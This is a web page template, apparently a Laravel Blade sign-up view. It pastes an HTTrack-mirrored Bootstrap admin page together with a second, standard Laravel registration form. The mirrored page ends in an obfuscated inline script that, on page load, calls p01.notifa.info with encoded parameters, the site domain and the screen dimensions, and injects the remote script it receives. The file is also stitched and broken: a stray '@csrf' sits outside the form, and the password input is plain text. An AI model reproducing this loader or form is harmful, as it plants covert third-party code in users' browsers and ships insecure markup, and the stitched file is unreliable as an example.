<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from codervent.com/rocker/color-version/authentication-signup2.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
  <meta name="description" content=""/>
  <meta name="author" content=""/>
  <title>Rocker - Bootstrap4  Admin Dashboard Template</title>
  <!--favicon-->
  <link rel="icon" href="assets/images/favicon.ico" type="image/x-icon">
  <!-- Bootstrap core CSS-->
  <link href="assets/css/bootstrap.min.css" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="assets/css/animate.css" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="assets/css/icons.css" rel="stylesheet" type="text/css"/>
  <!-- Custom Style-->
  <link href="assets/css/app-style.css" rel="stylesheet"/>
  
</head>

<body>
 <!-- Start wrapper-->
 <div id="wrapper">
       <div class="card-authentication2 mx-auto my-3">
        <div class="card-group">
            <div class="card mb-0">
               <div class="bg-signup2"></div>
                <div class="card-img-overlay rounded-left my-5">
                 <h2 class="text-white">Lorem</h2>
                 <h1 class="text-white">Ipsum Dolor</h1>
                 <p class="card-text text-white pt-3">There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form, by injected humour, or randomised words which don't look even slightly believable.</p>
             </div>
            </div>

            <div class="card mb-0">
                <div class="card-body">
                    <div class="card-content p-3">
                        <div class="text-center">
                            <img src="assets/images/logo-icon.png">
                        </div>
                     <div class="card-title text-uppercase text-center py-3">Sign Up</div>
                     @csrf
                        <form method="post" action="{{ route('register') }}">
                          <div class="form-group">
                           <div class="position-relative has-icon-left">
                              <label for="exampleInputName" class="sr-only">Name</label>
                              <input type="text" id="exampleInputName" class="form-control" placeholder="Name">
                              <div class="form-control-position">
                                  <i class="icon-user"></i>
                              </div>
                           </div>
                          </div>
                          <div class="form-group">
                           <div class="position-relative has-icon-left">
                              <label for="exampleInputEmailId" class="sr-only">Email ID</label>
                              <input type="text" name="email" id="exampleInputEmailId" class="form-control" placeholder="Email ID">
                              <div class="form-control-position">
                                  <i class="icon-envelope-open"></i>
                              </div>
                           </div>
                          </div>
                          <div class="form-group">
                           <div class="position-relative has-icon-left">
                              <label for="exampleInputPassword" class="sr-only">Password</label>
                              <input type="text" name="password" id="exampleInputPassword" class="form-control" placeholder="Password">
                              <div class="form-control-position">
                                  <i class="icon-lock"></i>
                              </div>
                           </div>
                          </div>
                          <div class="form-group">
                           <div class="position-relative has-icon-left">
                              <label for="exampleInputRetryPassword" class="sr-only">Retry Password</label>
                              <input type="password" id="exampleInputRetryPassword" class="form-control" placeholder="Retry Password">
                              <div class="form-control-position">
                                  <i class="icon-lock"></i>
                              </div>
                           </div>
                          </div>
                          <div class="form-group">
                           <div class="icheck-primary">
                            <input type="checkbox" id="user-checkbox" checked="" />
                            <label for="user-checkbox">I Accept terms & conditions</label>
                          </div>
                         </div>
                         <button type="submit" class="btn btn-outline-primary btn-block waves-effect waves-light">Sign Up</button>
                         <div class="text-center pt-3">
                         <p>or Sign up with</p>
                         <a href="javascript:void()" class="btn-social-text btn-outline-facebook waves-effect waves-light m-1"><i class="fa fa-facebook-square"></i> <span>facebook</span></a>
                         <a href="javascript:void()" class="btn-social-text btn-outline-google-plus waves-effect waves-light m-1"><i class="fa fa-google-plus"></i> <span>google+</span></a>
                         <hr>
                         <p class="text-muted">Already have an account? <a href="authentication-signin2.html"> Sign In here</a></p>
                         </div>
                    </form>
                 </div>
                </div>
            </div>
         </div>
        </div>
    
     <!--Start Back To Top Button-->
    <a href="javaScript:void();" class="back-to-top"><i class="fa fa-angle-double-up"></i> </a>
    <!--End Back To Top Button-->
    </div><!--wrapper-->
    
  <!-- Bootstrap core JavaScript-->
  <script src="assets/js/jquery.min.js"></script>
  <script src="assets/js/popper.min.js"></script>
  <script src="assets/js/bootstrap.min.js"></script>
 
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuhGIPo3XfCO7NzFh%2bR4TNDzRRkmzfNjYBEvaH9PYWrTRLst0gOFrth%2b5%2bglwDMtd0b5zCWd17vzzhOpEuw6lAYJLz51ArrOOl8Y5SjZniMbiGG7ehzGvgxzMNS6uPTx4NZGMOhp%2biiQN98wF7PBI%2bb0GrGgCVCKQ0dbloBBvL2ab7jiRnWXkEkCN7LF8DoXa3CYAsn40pNJ9NGCiGJcDabb1TnBwqp8yKlYNfd7D7tJHkcCtYGMnpmx8kuHeFLdClLcVBTDYi7RE6XycAozCKEoH53nMGDxjsKXGvBuo4aJpUfRp%2fwKEvqZd4PPCskQgqqSOBWuR%2bwYGNccAYy8scAa3wyxfNlj7X7972JNtyw5RaQKThqkAO8Z748nKvN9KVHUT2QioB6wrdhgYv5EWspuvWGUHioCpYClPd5QsG5wYrBGTNQ53u3NBZ%2fDQsnGazYV0Ipo0j8HDA6p0zDqRerBGqUT1mOqkBdXqFwmait%2fKGuTrNnUadb2Z6p7LA25nrY%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from codervent.com/rocker/color-version/authentication-signup2.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 15 Nov 2019 12:20:55 GMT -->
</html>















































@extends('layouts.app')

@section('content')
<div class="container">
    <div class="row justify-content-center">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">{{ __('Register') }}</div>

                <div class="card-body">
                    <form method="POST" action="{{ route('register') }}">
                        @csrf

                        <div class="form-group row">
                            <label for="name" class="col-md-4 col-form-label text-md-right">{{ __('Name') }}</label>

                            <div class="col-md-6">
                                <input id="name" type="text" class="form-control @error('name') is-invalid @enderror" name="name" value="{{ old('name') }}" required autocomplete="name" autofocus>

                                @error('name')
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                @enderror
                            </div>
                        </div>

                        <div class="form-group row">
                            <label for="email" class="col-md-4 col-form-label text-md-right">{{ __('E-Mail Address') }}</label>

                            <div class="col-md-6">
                                <input id="email" type="email" class="form-control @error('email') is-invalid @enderror" name="email" value="{{ old('email') }}" required autocomplete="email">

                                @error('email')
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                @enderror
                            </div>
                        </div>

                        <div class="form-group row">
                            <label for="password" class="col-md-4 col-form-label text-md-right">{{ __('Password') }}</label>

                            <div class="col-md-6">
                                <input id="password" type="password" class="form-control @error('password') is-invalid @enderror" name="password" required autocomplete="new-password">

                                @error('password')
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $message }}</strong>
                                    </span>
                                @enderror
                            </div>
                        </div>

                        <div class="form-group row">
                            <label for="password-confirm" class="col-md-4 col-form-label text-md-right">{{ __('Confirm Password') }}</label>

                            <div class="col-md-6">
                                <input id="password-confirm" type="password" class="form-control" name="password_confirmation" required autocomplete="new-password">
                            </div>
                        </div>

                        <div class="form-group row mb-0">
                            <div class="col-md-6 offset-md-4">
                                <button type="submit" class="btn btn-primary">
                                    {{ __('Register') }}
                                </button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection
